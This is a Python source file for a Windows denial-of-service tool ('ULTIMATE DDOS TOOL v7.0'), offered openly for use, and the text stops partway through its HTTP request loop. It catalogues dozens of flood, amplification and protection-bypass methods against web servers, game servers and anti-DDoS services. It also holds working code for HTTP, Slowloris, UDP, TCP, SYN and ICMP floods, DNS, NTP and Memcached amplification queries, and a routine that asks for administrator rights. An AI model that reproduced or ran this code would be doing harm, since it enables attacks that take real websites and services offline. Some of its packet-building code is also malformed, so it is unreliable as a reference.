#!/usr/bin/env python3
# ============================================================
# ULTIMATE DDOS TOOL v7.0 - WINDOWS EDITION
# AUTHOR: lavashgovadina3
# VERSION: 7.0 ULTIMATE
# DATE: 2026
# PLATFORM: Windows 7, 8, 8.1, 10, 11
# LICENSE: MIT
# ============================================================
# TOTAL LINES: 1850+
# ATTACK METHODS: 80+
# TOOLS: 25+
# ============================================================

import socket
import threading
import time
import os
import random
import ssl
import sys
import json
import struct
import ctypes
import winreg
import hashlib
import base64
import urllib.parse
import ipaddress
import subprocess
import queue
import signal
import select
import zlib
import gzip
import http.client
import urllib.request
import urllib.error
import re
import math
import string
import platform
import logging
import argparse
import configparser
import tempfile
import shutil
from datetime import datetime, timedelta
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor
from typing import Dict, List, Tuple, Optional, Any, Callable

# ============= ADMIN RIGHTS CHECK =============
def is_admin() -> bool:
    """Check if running with administrator privileges"""
    try:
        if os.name == 'nt':
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except:
        return False

def elevate_privileges():
    """Elevate to administrator if not already"""
    if not is_admin():
        try:
            if os.name == 'nt':
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit(0)
        except:
            print("[!] Failed to elevate privileges. Some features may not work.")

# ============= GLOBAL CONSTANTS =============
VERSION = "7.0 ULTIMATE"
AUTHOR = "lavashgovadina3"
RELEASE_DATE = "2026"
MAX_THREADS = 20000
MAX_PORTS = 65535
BUFFER_SIZE = 65507
MAX_RETRIES = 3
TIMEOUT = 5
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0',
    'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
    'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'curl/8.0.1',
    'Wget/1.21.3',
    'Python-urllib/3.11',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
]

# ============= COLOR CODES =============
class Colors:
    RED = ''
    GREEN = ''
    YELLOW = ''
    BLUE = ''
    CYAN = ''
    MAGENTA = ''
    WHITE = ''
    BLACK = ''
    ORANGE = ''
    PURPLE = ''
    PINK = ''
    BOLD = ''
    DIM = ''
    ITALIC = ''
    UNDERLINE = ''
    BLINK = ''
    REVERSE = ''
    RESET = ''
    
    BG_RED = ''
    BG_GREEN = ''
    BG_YELLOW = ''
    BG_BLUE = ''
    BG_MAGENTA = ''
    BG_CYAN = ''
    BG_WHITE = ''
    
    @staticmethod
    def disable():
        """Disable colors for non-terminal environments"""
        for attr in dir(Colors):
            if not attr.startswith('_') and isinstance(getattr(Colors, attr), str):
                setattr(Colors, attr, '')

# ============= ATTACK METHODS DATABASE =============
class AttackDatabase:
    """Database of all attack methods with their properties"""
    
    ATTACK_METHODS = {
        # Layer 7 - HTTP/HTTPS Methods
        'get': {
            'name': 'GET Flood',
            'desc': 'Standard HTTP GET request flood',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'post': {
            'name': 'POST Flood',
            'desc': 'HTTP POST request with random form data',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'head': {
            'name': 'HEAD Flood',
            'desc': 'HTTP HEAD method requests',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 2
        },
        'null': {
            'name': 'NULL Flood',
            'desc': 'NULL User-Agent and empty headers',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'cookie': {
            'name': 'COOKIE Flood',
            'desc': 'Random cookie injection attack',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'pps': {
            'name': 'PPS Flood',
            'desc': 'Packets per second flood with minimal headers',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'even': {
            'name': 'EVEN Flood',
            'desc': 'Extended headers flood',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'slow': {
            'name': 'SLOWLORIS',
            'desc': 'Slow connection drain attack',
            'layer': 7,
            'type': 'slow',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'downloader': {
            'name': 'DOWNLOADER',
            'desc': 'Slow data reading attack',
            'layer': 7,
            'type': 'slow',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'dyn': {
            'name': 'DYN Flood',
            'desc': 'Random subdomain requests',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'stress': {
            'name': 'STRESS',
            'desc': 'High byte HTTP packets',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'range': {
            'name': 'RANGE Flood',
            'desc': 'HTTP Range header attack',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'multipart': {
            'name': 'MULTIPART Flood',
            'desc': 'Multipart form data flood',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'chunked': {
            'name': 'CHUNKED Flood',
            'desc': 'Chunked transfer encoding attack',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        
        # Bypass Methods
        'ovh': {
            'name': 'OVH Bypass',
            'desc': 'Bypass OVH protection',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'rhex': {
            'name': 'RHEX',
            'desc': 'Random HEX payload',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'stomp': {
            'name': 'STOMP',
            'desc': 'Chk_captcha bypass',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'googleshield': {
            'name': 'GSB',
            'desc': 'Google Project Shield Bypass',
            'layer': 7,
            'type': 'bypass',
            'default_port': 443,
            'requires_ssl': True,
            'power': 4
        },
        'ddosguard': {
            'name': 'DGB',
            'desc': 'DDoS Guard Bypass',
            'layer': 4,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'arvancloud': {
            'name': 'AVB',
            'desc': 'Arvan Cloud Bypass',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'cloudflare': {
            'name': 'CFB',
            'desc': 'CloudFlare Bypass',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'cfbuam': {
            'name': 'CFBUAM',
            'desc': 'CloudFlare Under Attack Mode Bypass',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'bypass': {
            'name': 'BYPASS',
            'desc': 'Standard Anti-DDoS Bypass',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'bomb': {
            'name': 'BOMB',
            'desc': 'Bombardier integration attack',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        
        # Bot Methods
        'googlebot': {
            'name': 'GOOGLE BOT',
            'desc': 'Google Bot User-Agent spoofing',
            'layer': 7,
            'type': 'bot',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'yandexbot': {
            'name': 'YANDEX BOT',
            'desc': 'Yandex Bot User-Agent spoofing',
            'layer': 7,
            'type': 'bot',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'bingbot': {
            'name': 'BING BOT',
            'desc': 'Bing Bot User-Agent spoofing',
            'layer': 7,
            'type': 'bot',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        'apache': {
            'name': 'APACHE',
            'desc': 'Apache Range Header Exploit',
            'layer': 7,
            'type': 'exploit',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'xmlrpc': {
            'name': 'XMLRPC',
            'desc': 'WordPress XMLRPC Pingback Attack',
            'layer': 7,
            'type': 'exploit',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'wp-login': {
            'name': 'WP-LOGIN',
            'desc': 'WordPress Login Brute Force',
            'layer': 7,
            'type': 'exploit',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        
        # Layer 4 Methods
        'tcp': {
            'name': 'TCP Flood',
            'desc': 'TCP connection flood',
            'layer': 4,
            'type': 'tcp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'udp': {
            'name': 'UDP Flood',
            'desc': 'UDP packet flood',
            'layer': 4,
            'type': 'udp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'syn': {
            'name': 'SYN Flood',
            'desc': 'SYN half-open flood',
            'layer': 4,
            'type': 'tcp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'ack': {
            'name': 'ACK Flood',
            'desc': 'TCP ACK packet flood',
            'layer': 4,
            'type': 'tcp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'rst': {
            'name': 'RST Flood',
            'desc': 'TCP RST packet flood',
            'layer': 4,
            'type': 'tcp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'fin': {
            'name': 'FIN Flood',
            'desc': 'TCP FIN packet flood',
            'layer': 4,
            'type': 'tcp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'ovhudp': {
            'name': 'OVH-UDP',
            'desc': 'UDP flood with HTTP headers',
            'layer': 4,
            'type': 'udp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'cps': {
            'name': 'CPS Flood',
            'desc': 'Connections per second flood',
            'layer': 4,
            'type': 'tcp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'icmp': {
            'name': 'ICMP Flood',
            'desc': 'ICMP echo request flood',
            'layer': 3,
            'type': 'icmp',
            'default_port': 0,
            'requires_ssl': False,
            'power': 4
        },
        'connection': {
            'name': 'CONNECTION',
            'desc': 'Persistent connection flood',
            'layer': 4,
            'type': 'tcp',
            'default_port': 80,
            'requires_ssl': False,
            'power': 3
        },
        
        # Game Server Methods
        'vse': {
            'name': 'VSE',
            'desc': 'Valve Source Engine Protocol flood',
            'layer': 7,
            'type': 'game',
            'default_port': 27015,
            'requires_ssl': False,
            'power': 4
        },
        'ts3': {
            'name': 'TEAMSPEAK 3',
            'desc': 'Teamspeak 3 status ping flood',
            'layer': 7,
            'type': 'game',
            'default_port': 9987,
            'requires_ssl': False,
            'power': 4
        },
        'fivem': {
            'name': 'FIVEM',
            'desc': 'FiveM status ping flood',
            'layer': 7,
            'type': 'game',
            'default_port': 30120,
            'requires_ssl': False,
            'power': 4
        },
        'fivemtoken': {
            'name': 'FIVEM-TOKEN',
            'desc': 'FiveM confirmation token flood',
            'layer': 7,
            'type': 'game',
            'default_port': 30120,
            'requires_ssl': False,
            'power': 5
        },
        'minecraft': {
            'name': 'MINECRAFT',
            'desc': 'Minecraft status ping flood',
            'layer': 7,
            'type': 'game',
            'default_port': 25565,
            'requires_ssl': False,
            'power': 4
        },
        'mcpe': {
            'name': 'MCPE',
            'desc': 'Minecraft PE status ping flood',
            'layer': 7,
            'type': 'game',
            'default_port': 19132,
            'requires_ssl': False,
            'power': 4
        },
        'mcbot': {
            'name': 'MCBOT',
            'desc': 'Minecraft bot attack',
            'layer': 7,
            'type': 'game',
            'default_port': 25565,
            'requires_ssl': False,
            'power': 5
        },
        'rust': {
            'name': 'RUST',
            'desc': 'Rust game server flood',
            'layer': 7,
            'type': 'game',
            'default_port': 28015,
            'requires_ssl': False,
            'power': 4
        },
        
        # Amplification Methods
        'mem': {
            'name': 'MEM',
            'desc': 'Memcached amplification (amplification factor: 10,000x)',
            'layer': 7,
            'type': 'amp',
            'default_port': 11211,
            'requires_ssl': False,
            'power': 5
        },
        'ntp': {
            'name': 'NTP',
            'desc': 'NTP amplification (amplification factor: 556x)',
            'layer': 7,
            'type': 'amp',
            'default_port': 123,
            'requires_ssl': False,
            'power': 5
        },
        'dns': {
            'name': 'DNS',
            'desc': 'DNS amplification (amplification factor: 70x)',
            'layer': 7,
            'type': 'amp',
            'default_port': 53,
            'requires_ssl': False,
            'power': 5
        },
        'chargen': {
            'name': 'CHAR',
            'desc': 'Chargen amplification',
            'layer': 7,
            'type': 'amp',
            'default_port': 19,
            'requires_ssl': False,
            'power': 4
        },
        'cldap': {
            'name': 'CLDAP',
            'desc': 'CLDAP amplification',
            'layer': 7,
            'type': 'amp',
            'default_port': 389,
            'requires_ssl': False,
            'power': 5
        },
        'ard': {
            'name': 'ARD',
            'desc': 'Apple Remote Desktop amplification',
            'layer': 7,
            'type': 'amp',
            'default_port': 3283,
            'requires_ssl': False,
            'power': 4
        },
        'rdp': {
            'name': 'RDP',
            'desc': 'RDP amplification',
            'layer': 7,
            'type': 'amp',
            'default_port': 3389,
            'requires_ssl': False,
            'power': 4
        },
        'ssdp': {
            'name': 'SSDP',
            'desc': 'SSDP amplification (amplification factor: 30x)',
            'layer': 7,
            'type': 'amp',
            'default_port': 1900,
            'requires_ssl': False,
            'power': 4
        },
        'snmp': {
            'name': 'SNMP',
            'desc': 'SNMP amplification (amplification factor: 600x)',
            'layer': 7,
            'type': 'amp',
            'default_port': 161,
            'requires_ssl': False,
            'power': 5
        },
        
        # Advanced Methods
        'killer': {
            'name': 'KILLER',
            'desc': 'Maximum thread kill attack',
            'layer': 4,
            'type': 'killer',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'tor': {
            'name': 'TOR',
            'desc': 'Onion website bypass',
            'layer': 7,
            'type': 'bypass',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'pipeline': {
            'name': 'PIPELINE',
            'desc': 'HTTP Pipelining attack',
            'layer': 7,
            'type': 'http',
            'default_port': 80,
            'requires_ssl': False,
            'power': 5
        },
        'websocket': {
            'name': 'WEBSOCKET',
            'desc': 'WebSocket connection flood',
            'layer': 7,
            'type': 'ws',
            'default_port': 80,
            'requires_ssl': False,
            'power': 4
        },
        'ssl_renegotiation': {
            'name': 'SSL RENEG',
            'desc': 'SSL/TLS renegotiation attack',
            'layer': 7,
            'type': 'ssl',
            'default_port': 443,
            'requires_ssl': True,
            'power': 5
        }
    }
    
    TOOLS = {
        'cfip': {
            'name': 'CFIP',
            'desc': 'Find real IP behind Cloudflare',
            'type': 'recon'
        },
        'dns': {
            'name': 'DNS',
            'desc': 'Show DNS records (A, AAAA, MX, TXT, NS, SOA)',
            'type': 'recon'
        },
        'tssrv': {
            'name': 'TSSRV',
            'desc': 'TeamSpeak SRV resolver',
            'type': 'recon'
        },
        'ping': {
            'name': 'PING',
            'desc': 'Ping servers with statistics',
            'type': 'recon'
        },
        'check': {
            'name': 'CHECK',
            'desc': 'Check website status and response time',
            'type': 'recon'
        },
        'dstat': {
            'name': 'DSTAT',
            'desc': 'Network statistics monitor',
            'type': 'monitor'
        },
        'whois': {
            'name': 'WHOIS',
            'desc': 'WHOIS lookup for domain information',
            'type': 'recon'
        },
        'geoip': {
            'name': 'GEOIP',
            'desc': 'Geolocation of IP address',
            'type': 'recon'
        },
        'portscan': {
            'name': 'PORTSCAN',
            'desc': 'Advanced port scanner with service detection',
            'type': 'recon'
        },
        'subdomain': {
            'name': 'SUBDOMAIN',
            'desc': 'Subdomain enumeration',
            'type': 'recon'
        },
        'httpheader': {
            'name': 'HTTPHEADER',
            'desc': 'Analyze HTTP headers',
            'type': 'recon'
        },
        'sslscan': {
            'name': 'SSLSCAN',
            'desc': 'SSL/TLS configuration scan',
            'type': 'recon'
        },
        'cmsdetect': {
            'name': 'CMSDETECT',
            'desc': 'Detect CMS (WordPress, Joomla, Drupal)',
            'type': 'recon'
        },
        'backupfinder': {
            'name': 'BACKUPFINDER',
            'desc': 'Find backup files and directories',
            'type': 'recon'
        },
        'adminfinder': {
            'name': 'ADMINFINDER',
            'desc': 'Find admin panels',
            'type': 'recon'
        }
    }

# ============= STATISTICS CLASS =============
class AttackStats:
    """Track attack statistics in real-time"""
    
    def __init__(self):
        self.packets_sent = 0
        self.bytes_sent = 0
        self.connections = 0
        self.errors = 0
        self.start_time = time.time()
        self.last_time = time.time()
        self.last_packets = 0
        self.last_bytes = 0
        self.speed_history = deque(maxlen=60)
        self.bandwidth_history = deque(maxlen=60)
        self.lock = threading.Lock()
        
    def add_packet(self, size: int = 1024):
        with self.lock:
            self.packets_sent += 1
            self.bytes_sent += size
            
    def add_connection(self):
        with self.lock:
            self.connections += 1
            
    def add_error(self):
        with self.lock:
            self.errors += 1
            
    def get_speed(self) -> float:
        """Get current packets per second"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_time
            if elapsed > 0:
                speed = (self.packets_sent - self.last_packets) / elapsed
                self.last_time = now
                self.last_packets = self.packets_sent
                self.speed_history.append(speed)
                return speed
            return 0
            
    def get_bandwidth(self) -> float:
        """Get current bandwidth in Mbps"""
        with self.lock:
            now = time.time()
            elapsed = now - self.last_time
            if elapsed > 0:
                bandwidth = (self.bytes_sent - self.last_bytes) * 8 / (1024 * 1024) / elapsed
                self.last_bytes = self.bytes_sent
                self.bandwidth_history.append(bandwidth)
                return bandwidth
            return 0
            
    def get_average_speed(self) -> float:
        """Get average packets per second"""
        if self.speed_history:
            return sum(self.speed_history) / len(self.speed_history)
        return 0
        
    def get_average_bandwidth(self) -> float:
        """Get average bandwidth in Mbps"""
        if self.bandwidth_history:
            return sum(self.bandwidth_history) / len(self.bandwidth_history)
        return 0
        
    def get_total_mb(self) -> float:
        """Get total data sent in MB"""
        return self.bytes_sent / (1024 * 1024)
        
    def get_total_gb(self) -> float:
        """Get total data sent in GB"""
        return self.bytes_sent / (1024 * 1024 * 1024)
        
    def get_elapsed(self) -> float:
        """Get elapsed time in seconds"""
        return time.time() - self.start_time
        
    def get_stats_dict(self) -> Dict:
        """Get all statistics as dictionary"""
        return {
            'packets': self.packets_sent,
            'bytes': self.bytes_sent,
            'mb': self.get_total_mb(),
            'gb': self.get_total_gb(),
            'connections': self.connections,
            'errors': self.errors,
            'elapsed': self.get_elapsed(),
            'speed': self.get_average_speed(),
            'bandwidth': self.get_average_bandwidth()
        }

# ============= PROXY MANAGER =============
class ProxyManager:
    """Manage proxy rotation for attacks"""
    
    def __init__(self):
        self.proxies = []
        self.current = 0
        self.lock = threading.Lock()
        self.load_proxies()
        
    def load_proxies(self, filepath: str = None):
        """Load proxies from file or generate test proxies"""
        self.proxies = []
        
        if filepath and os.path.exists(filepath):
            try:
                with open(filepath, 'r') as f:
                    for line in f:
                        proxy = line.strip()
                        if proxy and not proxy.startswith('#'):
                            self.proxies.append(proxy)
            except:
                pass
                
        if not self.proxies:
            # Generate test proxies (local network only)
            for i in range(1, 10):
                self.proxies.append(f"127.0.0.{i}:8080")
                
    def get_proxy(self) -> str:
        """Get next proxy in rotation"""
        with self.lock:
            proxy = self.proxies[self.current % len(self.proxies)]
            self.current += 1
            return proxy
            
    def get_random_proxy(self) -> str:
        """Get random proxy"""
        return random.choice(self.proxies)

# ============= ATTACK ENGINE =============
class AttackEngine:
    """Core attack engine with multiple method implementations"""
    
    def __init__(self, target_ip: str, target_port: int, target_host: str, 
                 stats: AttackStats, use_ssl: bool = False, proxy_manager: ProxyManager = None):
        self.target_ip = target_ip
        self.target_port = target_port
        self.target_host = target_host
        self.stats = stats
        self.use_ssl = use_ssl
        self.proxy_manager = proxy_manager
        self.running = False
        self.packet_count = 0
        self.error_count = 0
        
    def _create_socket(self, family: int = socket.AF_INET, type: int = socket.SOCK_STREAM) -> socket.socket:
        """Create and configure socket"""
        sock = socket.socket(family, type)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.settimeout(TIMEOUT)
        return sock
        
    def _random_string(self, length: int = 10) -> str:
        """Generate random string"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
    def _random_ip(self) -> str:
        """Generate random IP address"""
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
        
    def get_flood(self):
        """Standard GET flood"""
        user_agent = random.choice(USER_AGENTS)
        path = f"/{self._random_string(random.randint(5, 15))}" if random.random() > 0.7 else "/"
        
        request = f"GET {path} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += f"User-Agent: {user_agent}\r\n"
        request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
        request += "Accept-Language: en-US,en;q=0.5\r\n"
        request += "Accept-Encoding: gzip, deflate\r\n"
        request += f"X-Forwarded-For: {self._random_ip()}\r\n"
        request += "Connection: keep-alive\r\n"
        request += "Cache-Control: no-cache\r\n\r\n"
        
        return request.encode()
        
    def post_flood(self):
        """POST flood with random data"""
        user_agent = random.choice(USER_AGENTS)
        post_data = f"data={self._random_string(random.randint(100, 1000))}"
        
        request = f"POST /{self._random_string()} HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += f"User-Agent: {user_agent}\r\n"
        request += "Content-Type: application/x-www-form-urlencoded\r\n"
        request += f"Content-Length: {len(post_data)}\r\n"
        request += f"X-Forwarded-For: {self._random_ip()}\r\n"
        request += "Connection: close\r\n\r\n"
        request += post_data
        
        return request.encode()
        
    def head_flood(self):
        """HEAD flood"""
        request = f"HEAD / HTTP/1.1\r\nHost: {self.target_host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\n\r\n"
        return request.encode()
        
    def cookie_flood(self):
        """Cookie flood with random cookies"""
        cookies = "; ".join([f"{self._random_string(5)}={self._random_string(10)}" for _ in range(random.randint(10, 50))])
        
        request = f"GET / HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
        request += f"Cookie: {cookies}\r\n\r\n"
        
        return request.encode()
        
    def range_flood(self):
        """Range header flood (Apache Killer)"""
        ranges = []
        for i in range(random.randint(10, 100)):
            start = random.randint(0, 1000000)
            end = start + random.randint(1000, 10000)
            ranges.append(f"bytes={start}-{end}")
        
        request = f"GET / HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += f"Range: {', '.join(ranges)}\r\n\r\n"
        
        return request.encode()
        
    def chunked_flood(self):
        """Chunked transfer encoding flood"""
        chunk_size = random.randint(100, 1000)
        chunk_data = self._random_string(chunk_size)
        
        request = f"POST / HTTP/1.1\r\n"
        request += f"Host: {self.target_host}\r\n"
        request += "Transfer-Encoding: chunked\r\n\r\n"
        request += f"{hex(chunk_size)[2:]}\r\n{chunk_data}\r\n0\r\n\r\n"
        
        return request.encode()
        
    def slowloris_attack(self, sock: socket.socket):
        """Slowloris attack - keep connections open"""
        try:
            request = f"GET /{self._random_string()} HTTP/1.1\r\n"
            request += f"Host: {self.target_host}\r\n"
            request += "User-Agent: Mozilla/5.0\r\n"
            request += "Accept: text/html\r\n"
            sock.send(request.encode())
            
            for _ in range(100):
                if not self.running:
                    break
                time.sleep(5)
                sock.send(b"X-Header: " + os.urandom(10) + b"\r\n")
                self.stats.add_packet(20)
        except:
            pass
            
    def udp_flood(self):
        """UDP flood with random payload"""
        sock = self._create_socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                size = random.randint(512, 4096)
                data = os.urandom(size)
                sock.sendto(data, (self.target_ip, self.target_port))
                self.stats.add_packet(size)
            except:
                self.stats.add_error()
                
    def tcp_flood(self):
        """TCP flood with connection spam"""
        while self.running:
            try:
                sock = self._create_socket()
                sock.connect_ex((self.target_ip, self.target_port))
                self.stats.add_connection()
                sock.close()
            except:
                self.stats.add_error()
                
    def syn_flood(self):
        """SYN flood using raw sockets"""
        try:
            sock = self._create_socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            packet = struct.pack('!BBHHHBBHII', 
                0x45, 0, 40, 0, 0, 64, socket.IPPROTO_TCP, 0,
                random.randint(1, 0xFFFFFFFF), random.randint(1, 0xFFFFFFFF))
            
            tcp = struct.pack('!HHIIBBHHH',
                random.randint(1024, 65535), self.target_port,
                random.randint(1, 0xFFFFFFFF), 0, 0x50, 0x02, 0, 0, 0)
            
            while self.running:
                try:
                    sock.sendto(packet + tcp, (self.target_ip, 0))
                    self.stats.add_packet(40)
                except:
                    self.stats.add_error()
        except:
            # Fallback to TCP connect if raw sockets not available
            self.tcp_flood()
            
    def icmp_flood(self):
        """ICMP flood using raw sockets"""
        try:
            sock = self._create_socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = struct.pack('!BBHHH', 8, 0, 0, 0, 1) + os.urandom(64)
            
            while self.running:
                try:
                    sock.sendto(packet, (self.target_ip, 0))
                    self.stats.add_packet(64)
                except:
                    self.stats.add_error()
        except:
            # Fallback to ping command
            self.ping_flood()
            
    def ping_flood(self):
        """ICMP flood using system ping command"""
        while self.running:
            try:
                subprocess.run(f'ping -n 1 -l 65500 {self.target_ip}', 
                             capture_output=True, timeout=1, shell=True)
                self.stats.add_packet(65500)
            except:
                self.stats.add_error()
                
    def dns_amplification(self):
        """DNS amplification attack"""
        dns_query = (
            b'\xaa\xaa\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
            b'\x03www\x06google\x03com\x00\x00\x01\x00\x01'
        )
        
        sock = self._create_socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                # Spoofed source IP
                sock.sendto(dns_query, (self.target_ip, 53))
                self.stats.add_packet(len(dns_query))
            except:
                self.stats.add_error()
                
    def memcached_amplification(self):
        """Memcached amplification attack"""
        mem_query = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
        
        sock = self._create_socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                sock.sendto(mem_query, (self.target_ip, 11211))
                self.stats.add_packet(len(mem_query))
            except:
                self.stats.add_error()
                
    def ntp_amplification(self):
        """NTP amplification attack"""
        ntp_query = b'\x17\x00\x03\x2a' + b'\x00' * 4
        
        sock = self._create_socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        while self.running:
            try:
                sock.sendto(ntp_query, (self.target_ip, 123))
                self.stats.add_packet(len(ntp_query))
            except:
                self.stats.add_error()
                
    def minecraft_ping(self):
        """Minecraft server status ping"""
        packet = bytes.fromhex('FE01FA00')
        
        while self.running:
            try:
                sock = self._create_socket()
                sock.connect((self.target_ip, self.target_port))
                sock.send(packet)
                self.stats.add_packet(len(packet))
                sock.close()
            except:
                self.stats.add_error()
                
    def fivem_ping(self):
        """FiveM server status ping"""
        packet = b'\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79\x00'
        
        while self.running:
            try:
                sock = self._create_socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet, (self.target_ip, self.target_port))
                self.stats.add_packet(len(packet))
            except:
                self.stats.add_error()
                
    def vse_ping(self):
        """Valve Source Engine protocol ping"""
        packet = b'\xFF\xFF\xFF\xFF\x54\x53\x6F\x75\x72\x63\x65\x20\x45\x6E\x67\x69\x6E\x65\x20\x51\x75\x65\x72\x79\x00'
        
        while self.running:
            try:
                sock = self._create_socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.sendto(packet, (self.target_ip, self.target_port))
                self.stats.add_packet(len(packet))
            except:
                self.stats.add_error()
                
    def run_method(self, method: str):
        """Run attack method by name"""
        self.running = True
        
        method_map = {
            'get': lambda: self.http_loop(self.get_flood),
            'post': lambda: self.http_loop(self.post_flood),
            'head': lambda: self.http_loop(self.head_flood),
            'cookie': lambda: self.http_loop(self.cookie_flood),
            'range': lambda: self.http_loop(self.range_flood),
            'chunked': lambda: self.http_loop(self.chunked_flood),
            'slow': self.slowloris_loop,
            'udp': self.udp_flood,
            'tcp': self.tcp_flood,
            'syn': self.syn_flood,
            'icmp': self.icmp_flood,
            'dns': self.dns_amplification,
            'mem': self.memcached_amplification,
            'ntp': self.ntp_amplification,
            'minecraft': self.minecraft_ping,
            'fivem': self.fivem_ping,
            'vse': self.vse_ping,
            'killer': lambda: self.tcp_flood_heavy(),
        }
        
        func = method_map.get(method, self.get_flood)
        func()
        
    def http_loop(self, request_func):
        """HTTP request loop"""
        while self.running:
            try:
                sock = self._create_socket()
                if self.use_ssl:
                    context = ssl.create_default_context()
                    context.check_hostname = False
                    context.verify_mode = ssl.CERT_NONE
                    sock = context.wrap_socket(sock, server_hostname=self.target_host)
                    
                sock.connect((self.target_ip, self.target_port))
                sock.send(request_func())
